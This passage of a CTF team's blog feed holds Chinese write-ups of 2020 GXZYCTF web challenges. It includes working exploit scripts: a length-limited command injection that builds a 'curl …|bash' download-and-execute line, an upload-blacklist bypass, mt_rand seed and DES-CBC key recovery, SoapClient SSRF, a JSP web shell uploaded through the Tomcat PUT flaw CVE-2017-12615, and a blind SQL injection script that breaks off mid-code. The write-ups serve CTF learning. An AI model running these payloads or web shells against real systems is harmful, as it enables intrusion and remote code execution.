sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># 将 "g&gt; ht- sl" 写到文件 "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>, </span><br><span class="line">    <span class="string">'&gt;sl'</span>, </span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># 将文件"v"中的字符串倒序，放到文件"x"，就变成了 "ls -th &gt;g"</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash`</span></span><br><span class="line">    <span class="string">'&gt;p\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ph\\'</span>, </span><br><span class="line">    <span class="string">'&gt;a.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;72\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cf\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cc\\'</span>, </span><br><span class="line">    <span class="string">'&gt;81\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0x\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># getshell</span></span><br><span class="line">    <span class="string">'sh x'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload_all = <span class="string">'compress.zlib://data:@127.0.0.1/plain;base64,&#123;0&#125;'</span></span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>: <span class="string">'ddd'</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://121.36.222.22:88/core/clear.php'</span>,cookies=cookies)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">20</span>                 <span class="comment">#最大词数~~ </span></span><br><span class="line">    r = requests.post(<span class="string">'http://121.36.222.22:88/core/index.php'</span>,cookies=cookies,data=&#123;<span class="string">"url"</span>:payload_all.format(base64.b64encode(i))&#125;)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;考点一、源码泄露&lt;/p&gt;
&lt;p&gt;扫到源码&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_伪协议" scheme="https://boiteam.github.io/tags/Web-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="Web_session反序列化" scheme="https://boiteam.github.io/tags/Web-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Web_命令执行" scheme="https://boiteam.github.io/tags/Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF happyvacation</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_happyvacation/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_happyvacation/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T12:33:01.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="one"><a href="#one" class="headerlink" title="one"></a>one</h1><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584757078800.png" alt="1584757078800"></p><p>得到源码，突破点为：</p><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584757117018.png" alt="1584757117018"></p><p>clone的复制是浅复制</p><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584757135276.png" alt="1584757135276"></p><p>也就是我们可以覆盖这个类中的一些元素, 那么看一下这个<code>$user</code>怎么传</p><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584757155282.png" alt="1584757155282"></p><p> 我们既然可以覆盖元素, 那么比如</p><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584757206179-1584782969746.png" alt="1584757206179"></p><p>EXP</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.2.106:4000/"</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line">def login():</span><br><span class="line">    sess.<span class="builtin-name">get</span>(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"cjm00n"</span></span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(url, <span class="attribute">data</span>=data)</span><br><span class="line">def cover(user):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">"answer"</span>: user</span><br><span class="line">    &#125;</span><br><span class="line">    resp = sess.<span class="builtin-name">get</span>(f<span class="string">"&#123;url&#125;quiz.php"</span>, <span class="attribute">params</span>=params).text</span><br><span class="line">    <span class="builtin-name">print</span>(resp)</span><br><span class="line">def upload():</span><br><span class="line">    files = [</span><br><span class="line">        (<span class="string">"file"</span>, (<span class="string">"1.php"</span>, open(<span class="string">"1.php"</span>).read()))</span><br><span class="line">    ]</span><br><span class="line">    resp = sess.post(f<span class="string">"&#123;url&#125;customlize.php?refer=index"</span>, <span class="attribute">files</span>=files).text</span><br><span class="line">    <span class="builtin-name">print</span>(resp)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    login()</span><br><span class="line">    cover(<span class="string">"user-&gt;uploader-&gt;black_list"</span>)</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584757307294-1584782991413.png" alt="1584757307294"></p><h1 id="two"><a href="#two" class="headerlink" title="two"></a>two</h1><p>审计代码发现答题的地方有个eval，answer参数有几个过滤，不能直接命令注入</p><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584758165070-1584783008048.png" alt="1584758165070"></p><p>但是看到this-&gt;user引入了上一层的$user，想到另外还有个上传点，于是构造</p><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584758195724.png" alt="1584758195724"></p><p>把uploader中的上传后缀黑名单清除，就能上传php文件了</p><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584758223733.png" alt="1584758223733"></p><p><img src="/2020/03/09/2020_GXZYCTF_happyvacation/1584758242020.png" alt="1584758242020"></p><p>最后直接读取/flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;one&quot;&gt;&lt;a href=&quot;#one&quot; class=&quot;headerlink&quot; title=&quot;one&quot;&gt;&lt;/a&gt;one&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_happyvacation/1584757078800.png&quot; alt=&quot;1584757078800&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_代码审计" scheme="https://boiteam.github.io/tags/Web-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF NORTHWRD</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:16:40.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="first"><a href="#first" class="headerlink" title="first"></a>first</h1><p>从<a href="http://www.zip获取源码" target="_blank" rel="noopener">www.zip获取源码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">   $IV = <span class="string">"85196940"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">           $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">           $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">       &#125;</span><br><span class="line">       $username = <span class="string">"guest"</span>;</span><br><span class="line">       $o = <span class="keyword">new</span> User($username);</span><br><span class="line">       <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">       $ser_user = serialize($o);</span><br><span class="line">       $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">       setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">       setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">       $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">       <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       $o = unserialize($uid);</span><br><span class="line">       <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">       <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">           $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">           <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以观察到, 加密模式为<code>des-cbc</code></p><p>但是明文我们却是知道的, 我们看加密的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$o = <span class="keyword">new</span> User($username);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">$ser_user = serialize($o);</span><br><span class="line">$cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br></pre></td></tr></table></figure><p>那么我们现在已知明文密文, 如果能够再获得 key 或者 iv, 就可以直接加解密了, 因为 des-cbc 的加密方式如下（CBC字节翻转原理）</p><p><img src="/2020/03/09/2020_GXZYCTF_northardweb/1584756068474.png" alt="1584756068474"></p><p>我们看第一个块, 首先取 8 个字节的明文, 与<code>IV</code>进行异或, 再与<code>KEY</code>进行加密运算, 之后输出 16 字节的密文, 而如果我们知道<code>KEY</code>, 后面则是用上一个块的加密结果代替<code>IV</code>异或, 而我们如果能知道<code>KEY</code>, 就可以将明文作为<code>IV</code>, 用密文和<code>KEY</code>进行解密, 获得的第一个块的值, 就是 IV</p><p>可以看到红框中的两个部分是一样的, 但是我们如何获取<code>KEY</code>呢, 注意到页面中给了这些信息</p><p><img src="/2020/03/09/2020_GXZYCTF_northardweb/1584756141031.png" alt="1584756141031"></p><p>而源代码中的mt_rand需要seed才能获取随机数。现在已知该函数产生的三个随机数。</p><p>采用文章中介绍的方法获取seed</p><p><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196831</a></p><p>破解脚本需配置三个参数</p><p>各参数分别为</p><ul><li>相隔 226 个数的 R0, R227</li><li>生成 R0 之前已经生成的个数 offset</li><li>flavour 如果是 php7 则为 1, php5 则为 0</li></ul><p>计算的部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// input seed</span></span><br><span class="line">$uid_first = $argv[<span class="number">1</span>]??<span class="number">1082636436</span>;</span><br><span class="line">$uid_last = $argv[<span class="number">2</span>]??<span class="number">306106574</span>;</span><br><span class="line">$seed = rtrim(shell_exec(<span class="string">"python seed.py $uid_first $uid_last"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"seed: $seed\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calc iv</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User(<span class="string">"guest"</span>);</span><br><span class="line">$mes = serialize($o);</span><br><span class="line">$c = $argv[<span class="number">3</span>]??<span class="string">"OS8vWDE4Mk5ETklJYytXTUFLZG5xU2hJeFkyQ2tXbTJEb01wWkhRUThkckpYcnFDR2RpalFhb3dDekRTem82RQ%3D%3D"</span>;</span><br><span class="line">$cipher = base64_decode(urldecode($c));</span><br><span class="line">mt_srand(intval($seed));</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">228</span>; $i++)&#123;</span><br><span class="line">    mt_rand();</span><br><span class="line">&#125;</span><br><span class="line">$key = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"key: $key\n"</span>;</span><br><span class="line">$iv = substr(openssl_decrypt($cipher, <span class="string">"des-cbc"</span>, $key, <span class="number">0</span>, substr($mes, <span class="number">0</span>, <span class="number">8</span>)),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"iv: $iv\n"</span>;</span><br></pre></td></tr></table></figure><p>然后我们就可以进行反序列化了, 先登录为<code>admin</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calc iv</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $username;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$o = <span class="keyword">new</span> User(<span class="string">"admin"</span>);</span><br><span class="line">$aaa = serialize($o);</span><br><span class="line">$cipher = openssl_encrypt($aaa, <span class="string">"des-cbc"</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line">$cookie_user =  base64_encode($cipher);</span><br><span class="line">$cookie_hash =  md5($aaa);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"user: $cookie_user\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hash: $cookie_hash\n"</span>;</span><br></pre></td></tr></table></figure><h1 id="second"><a href="#second" class="headerlink" title="second"></a>second</h1><p>hint.php 中直接给出了位置, 而右键就可以看到注释的源代码,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cc'</span>]))&#123;</span><br><span class="line">    $cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">    <span class="keyword">eval</span>(substr($cc, <span class="number">0</span>, <span class="number">6</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过/?cc=<code>$cc</code>的方式来绕过，因为<code>$cc</code>刚好是 6 个长度, 而<code>$</code>就是重新引用了变量, 使得长度不再受限, 那么我们就可以任意执行了</p><p>但是我们看提示的位置是在内网, 我们进不去, 有什么办法可以进去呢</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p>可以看到当调用<code>SoapClient</code>类不存在的方法时, 会触发<code>__call</code>, 使得我们拥有一个请求注入的机会, 这里就正好可以用来打 SSRF, 因为源码中存在一个反序列化, 反序列化的参数可控, 并且会调用一个<code>show()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$o = unserialize($uid);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br></pre></td></tr></table></figure><p>因而poc可以写为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = urlencode(<span class="string">"`\$cc`;bash -c 'payload'"</span>);</span><br><span class="line">$path = <span class="string">"http://10.10.1.12/"</span>;</span><br><span class="line">$path = $path.<span class="string">"?cc=$cmd"</span>;</span><br><span class="line">$o = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $path, <span class="string">'location'</span> =&gt; $path));</span><br><span class="line">$aaa = serialize($o);</span><br></pre></td></tr></table></figure><h1 id="third"><a href="#third" class="headerlink" title="third"></a>third</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615</a></p><p>一个tomcat的老洞，找到一个jsp马上传</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">out</span>.print(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">out</span>.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">out</span>.print(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">2.13</span>:<span class="number">8080</span><span class="regexp">/2.jsp/</span> -d <span class="string">"`echo PCUKICAgIGlmKCIwMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiaSIpKS5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgIGludCBhID0gLTE7CiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTsKICAgICAgICBvdXQucHJpbnQoIjxwcmU+Iik7CiAgICAgICAgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsKICAgICAgICAgICAgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7CiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9CiU+|base64 -d`"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;first&quot;&gt;&lt;a href=&quot;#first&quot; class=&quot;headerlink&quot; title=&quot;first&quot;&gt;&lt;/a&gt;first&lt;/h1&gt;&lt;p&gt;从&lt;a href=&quot;http://www.zip获取源码&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip获取源码&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_SSRF" scheme="https://boiteam.github.io/tags/Web-SSRF/"/>
    
      <category term="Web_CBC字节翻转" scheme="https://boiteam.github.io/tags/Web-CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF nweb</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_nweb/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_nweb/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T12:22:59.724Z</updated>
    
    <content type="html"><![CDATA[<p>根据登入后的提示，用户会有分级，注册账号的时候隐藏了type属性</p><p><img src="/2020/03/09/2020_GXZYCTF_nweb/0-1583722768764.png" alt>            </p><p>type赋值为110，登录后可以访问flag.php 里面是一个search框，可以测试一下注入</p><p><img src="/2020/03/09/2020_GXZYCTF_nweb/0-1583722779047.png" alt="img">            </p><p><img src="/2020/03/09/2020_GXZYCTF_nweb/0-1583722789446.png" alt="img">            </p><p>简单测试发现只过滤了select和from，可以双写绕过，所以写一个脚本跑就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag= <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">Cookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'huiulsnkb5bpm59h6v38o1qlv1;'</span>,</span><br><span class="line">          <span class="string">'username'</span>:<span class="string">'41fcba09f2bdcdf315ba4119dc7978dd'</span>&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">        <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid(CONCAT_WS(CHAR(32,58,32),user(),database(),version()),&#123;&#125;,1))&gt;&#123;&#125;)--+" #65</span></span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid((selselectect group_concat(column_NAME) frfromom information_schema.columnS where table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        payload=<span class="string">r"1' or 1=(ascii(mid((selselectect pwd frfromom admin limit 1),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        <span class="comment">#payload=r"1' or 1=(ascii(mid((database()),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">        url_1=url+payload.format(i,mid)</span><br><span class="line">        data=&#123;<span class="string">"flag"</span>:payload.format(i,mid)&#125;</span><br><span class="line">        r=requests.post(url,data=data,cookies=Cookie,proxies=proxies)</span><br><span class="line">        print(r.content)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"is flag"</span> <span class="keyword">in</span>  r.content:</span><br><span class="line">            low=mid+<span class="number">1</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">    print(flag)</span><br><span class="line">    